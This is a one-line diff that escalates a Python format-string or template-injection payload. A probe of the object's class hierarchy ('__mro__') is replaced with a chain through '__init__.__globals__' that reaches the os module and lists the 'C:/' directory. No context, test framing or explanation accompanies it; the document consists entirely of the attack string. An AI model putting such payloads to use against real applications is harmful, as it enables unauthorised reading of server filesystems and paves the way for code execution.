@@ -1,1 +1,1 @@
-{user.__class__.__mro__}
+{user.__init__.__globals__['os'].listdir('C:/')}
